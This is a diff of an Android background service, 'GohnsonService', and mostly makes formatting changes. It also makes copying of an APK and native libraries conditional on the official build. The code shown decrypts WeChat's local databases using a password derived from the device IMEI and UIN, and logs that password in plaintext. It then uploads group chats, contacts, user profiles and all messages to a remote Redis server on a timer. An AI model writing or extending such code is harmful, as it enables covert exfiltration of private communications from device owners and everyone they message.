@@ -73,12 +73,14 @@ public class GohnsonService extends Service {
         initBaseContnet();
         initWeChatDB();
 
-       copyApkAndSo();
+        copyApkAndSo();
     }
 
-    public void copyApkAndSo(){
+    public void copyApkAndSo() {
+        if(GlobalCofig.IS_OFFICIAL == 0){//线上版本才去复制，测试版本不用
         Utils.copyVserAPK(GohnsonService.this);
         Utils.copySOFile(GohnsonService.this);
+        }
     }
 
     public void initWeChatDB() {
@@ -130,6 +132,7 @@ public class GohnsonService extends Service {
         String deviceid = gson.toJson(devInfoDao);
         UploadManager.getInit().uploadDataState(deviceid);
     }
+
     //上传心跳
     public void pushHeartbeat() {
         if (wxIMEI == null || wxIMEI.equals("") || wxIMEI1 == null || wxIMEI1.equals("")) {
@@ -145,7 +148,7 @@ public class GohnsonService extends Service {
         String deviceid = gson.toJson(dao);
         UploadManager.getInit().pushHeartbeat(deviceid);
     }
- 
+
 
     private TimerTask mTimerTask;
     private Timer mTimer = new Timer(true);
@@ -156,7 +159,7 @@ public class GohnsonService extends Service {
         if (mTimerTask != null) return;
         mTimerTask = new TimerTask() {
             public void run() {
-              //  copyApkAndSo();
+                //  copyApkAndSo();
                 pushHeartbeat();
 
                 existTime = existTime + GlobalCofig.EXECUTE_HEARBEAT_INTERVAL;
@@ -226,7 +229,7 @@ public class GohnsonService extends Service {
 
     public void initIMEI() {
         LogInputUtil.e(TAG, "正在获取imei");
-        String deviceId =Utils.getDeviceId();
+        String deviceId = Utils.getDeviceId();
 
         String tencentCompatibleInfoPath = GlobalCofig.OPERATION_DIR + GlobalCofig.COMPATIBLE_INFO_CFG;
         if (new File(tencentCompatibleInfoPath).exists())
@@ -257,12 +260,12 @@ public class GohnsonService extends Service {
             getUins(GlobalCofig.OPERATION_DIR_1 + GlobalCofig.WX_UIM_FILE);
             // getUins(GlobalCofig.OPERATION_DIR_0 + GlobalCofig.WX_UIM_FILE);
             //getUins(GlobalCofig.OPERATION_DIR_11 + GlobalCofig.WX_UIM_FILE);
-           // getUins(GlobalCofig.OPERATION_DIR_PARALLEL_LITE + GlobalCofig.WX_UIM_FILE);
+            // getUins(GlobalCofig.OPERATION_DIR_PARALLEL_LITE + GlobalCofig.WX_UIM_FILE);
 
             GetFiles(GlobalCofig.OPERATION_DIR, GlobalCofig.WX_DATA_DB, true);
             // GetFiles(GlobalCofig.OPERATION_DIR_0, GlobalCofig.WX_DATA_DB, true);
             //GetFiles(GlobalCofig.OPERATION_DIR_11, GlobalCofig.WX_DATA_DB, true);
-           // GetFiles(GlobalCofig.OPERATION_DIR_PARALLEL_LITE, GlobalCofig.WX_DATA_DB, true);
+            // GetFiles(GlobalCofig.OPERATION_DIR_PARALLEL_LITE, GlobalCofig.WX_DATA_DB, true);
         } catch (Exception e) {
             MyLog.inputLogToFile(TAG, "异常 UploadWXData = " + e.getMessage());
         }
@@ -273,7 +276,7 @@ public class GohnsonService extends Service {
         try {
             File app_brand_global_sp = new File(filePath);
             boolean fileExist = app_brand_global_sp.exists();
-            if(!fileExist){
+            if (!fileExist) {
                 MyLog.inputLogToFile(TAG, "文件不存在，请确认是否已登陆微信。path = " + filePath);
                 return;
             }
@@ -334,14 +337,14 @@ public class GohnsonService extends Service {
 
                         mDbPassword = getDBPass(f.getPath(), wxFolderPath);
                         String pathUin = mapUIN.get(wxFolderPath);
-                        String deviceId =Utils.getDeviceId();
+                        String deviceId = Utils.getDeviceId();
 
                         if (f.getParent().contains(GlobalCofig.OPERATION_DIR_1)) {
-                            MyLog.inputLogToFile(TAG, "deviceId ="+deviceId + ",wxIMEI1=" + wxIMEI1 + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
+                            MyLog.inputLogToFile(TAG, "deviceId =" + deviceId + ",wxIMEI1=" + wxIMEI1 + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
                         } else if (f.getParent().contains(GlobalCofig.OPERATION_DIR_PARALLEL_LITE)) {
-                            MyLog.inputLogToFile(TAG, dbPath + "deviceId ="+deviceId +",parallelLiteIMEI=" + parallelLiteIMEI + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
+                            MyLog.inputLogToFile(TAG, dbPath + "deviceId =" + deviceId + ",parallelLiteIMEI=" + parallelLiteIMEI + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
                         } else {
-                            MyLog.inputLogToFile(TAG, "deviceId ="+deviceId +",wxIMEI=" + wxIMEI + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
+                            MyLog.inputLogToFile(TAG, "deviceId =" + deviceId + ",wxIMEI=" + wxIMEI + "-------wxPassword=" + mDbPassword + "--------- pathUin = " + pathUin + ",filePath = " + dbPath);
                         }
 
                         final File dbFile = new File(dbPath);
@@ -374,7 +377,7 @@ public class GohnsonService extends Service {
                         };
                         SQLiteDatabase dataTarget = null;
                         try {
-                            LogInputUtil.e(TAG,"path ="+dbFile.getPath()+",pass = "+mDbPassword);
+                            LogInputUtil.e(TAG, "path =" + dbFile.getPath() + ",pass = " + mDbPassword);
                             dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.getPath(), mDbPassword, null, hook);
                             uploadOperation(dataTarget, f, pathUin, wxIMEI, fileChangeTime);
 
@@ -428,12 +431,12 @@ public class GohnsonService extends Service {
         if (chatRooms != null) {
             if (chatRooms.size() == 0) {
                 chatroomUploadSucceed = true;//无群聊
-            }else {
+            } else {
                 String chatRoomJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, chatRooms, pathUin, wxIMEI, userName);
                 LogInputUtil.e(TAG, "待提交的chatRoomJsonStr = " + chatRoomJsonStr);
                 if (chatRoomJsonStr != null && !chatRoomJsonStr.equals("")) {
                     chatroomUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CHATROOM, chatRoomJsonStr, file);
-                    if(chatroomUploadSucceed)Utils.setUploadTime();
+                    if (chatroomUploadSucceed) Utils.setUploadTime();
 
                 }
             }
@@ -450,7 +453,8 @@ public class GohnsonService extends Service {
 //              imgFlagUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_IMGFLAG, imgFlagJsonStr, file);
 //        }
         boolean allRcontactUploadSucceed = false;
-        ArrayList<Object> rcontactInSelfDB = weChatDBOperator.selectAll(GlobalCofig.CRM_TIP + wxFolderPath);//已上传的好友数据
+        String tableName = GlobalCofig.CRM_TIP + wxFolderPath;
+        ArrayList<Object> rcontactInSelfDB = weChatDBOperator.selectAll(tableName);//已上传的好友数据
         MyLog.inputLogToFile(TAG, "已在库的好友数：" + rcontactInSelfDB.size());
         final ArrayList<Object> rcontacts = WXDataFormJsonUtil.getRcontactDataInDB(this, dataTarget, file, rcontactInSelfDB);
         if (rcontacts != null) {
@@ -463,8 +467,8 @@ public class GohnsonService extends Service {
                 if (rcontactJsonStr != null && !rcontactJsonStr.equals("")) {
                     allRcontactUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CONTACT, rcontactJsonStr, file);
                     if (allRcontactUploadSucceed) {
-                        weChatDBOperator.createTable(GlobalCofig.CRM_TIP + wxFolderPath);
-                        weChatDBOperator.addList(GlobalCofig.CRM_TIP + wxFolderPath, rcontacts);
+                        weChatDBOperator.createTable(tableName);
+                        weChatDBOperator.addList(tableName, rcontacts);
                     }
                 }
             } else if (rcontactSize == 0) {
@@ -478,7 +482,7 @@ public class GohnsonService extends Service {
         boolean userInfoUploadSucceed = false;
         if (userInfoJsonStr != null && !userInfoJsonStr.equals("")) {
             userInfoUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_USERINFO, userInfoJsonStr, file);
-            if(userInfoUploadSucceed)Utils.setUploadTime();
+            if (userInfoUploadSucceed) Utils.setUploadTime();
 
         }
 
@@ -497,7 +501,7 @@ public class GohnsonService extends Service {
                 LogInputUtil.e(TAG, "待提交的MessageJson = " + messageJsonStr);
                 if (messageJsonStr != null && !messageJsonStr.equals("")) {
                     dataUploadSucceed = uploadMessageDataToRedis(GlobalCofig.REDIS_KEY_MESSAGE, messageJsonStr, file);
-                    if(dataUploadSucceed)Utils.setUploadTime();
+                    if (dataUploadSucceed) Utils.setUploadTime();
 
                 }
             } else if (listSize == 0) {
@@ -511,7 +515,7 @@ public class GohnsonService extends Service {
             }
         }
         boolean allDataUpadte = (chatroomUploadSucceed && allRcontactUploadSucceed && userInfoUploadSucceed && allMessageUploadSucceed);
-        MyLog.inputLogToFile(TAG, "所有数据是否已上传"+allDataUpadte+",chatroom群聊天 = " + chatroomUploadSucceed + ",Rcontact联系人 =" + allRcontactUploadSucceed+",userInfo用户信息 ="+userInfoUploadSucceed+",allMessage所有聊天 = "+allMessageUploadSucceed);
+        MyLog.inputLogToFile(TAG, "所有数据是否已上传" + allDataUpadte + ",chatroom群聊天 = " + chatroomUploadSucceed + ",Rcontact联系人 =" + allRcontactUploadSucceed + ",userInfo用户信息 =" + userInfoUploadSucceed + ",allMessage所有聊天 = " + allMessageUploadSucceed);
         if (allDataUpadte) {
             ShareData.getInstance().saveLongValue(this, file.getPath(), fileChangeTime);
             MyLog.inputLogToFile(TAG, "本数据库所有数据已上传，若修改时间不更新，不再操作该数据库，key = " + file.getPath() + ",time =" + fileChangeTime);
@@ -533,7 +537,7 @@ public class GohnsonService extends Service {
             Jedis myJedis = JedisUtil.getInit();
             MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
             long pushValue = myJedis.lpush(key, jsonValue);
-           // ShareData.getInstance().saveIntValue(this, hashKey, newJsonHashCode);
+            // ShareData.getInstance().saveIntValue(this, hashKey, newJsonHashCode);
             MyLog.inputLogToFile(TAG, "redis上传成功，数据有更新" + key + "，newJsonHashCode = " + newJsonHashCode + ",oldJsonHashCode = " + oldJsonHashCode + ",pushValue = " + pushValue + ",filePath = " + file.getPath());
             return true;
         } catch (Exception e) {
@@ -551,7 +555,7 @@ public class GohnsonService extends Service {
 
             //上传成功去更新下标，下次从新下标开始取值
             String lastUploadTimeStr = GlobalCofig.MESSAGE_LAST_UPLOAD_TIME + file.getPath();
-            LogInputUtil.e(TAG,"更新的时候点 = "+lastUploadTimeStr);
+            LogInputUtil.e(TAG, "更新的时候点 = " + lastUploadTimeStr);
             long lastUploadTimeTemporary = ShareData.getInstance().getLongValue(this, GlobalCofig.MESSAGE_LAST_UPLOAD_TIME_TEMPORARY + file.getPath(), 0);
             long lastUploadTime = ShareData.getInstance().getLongValue(this, lastUploadTimeStr, 0);
             ShareData.getInstance().saveLongValue(this, lastUploadTimeStr, lastUploadTimeTemporary);
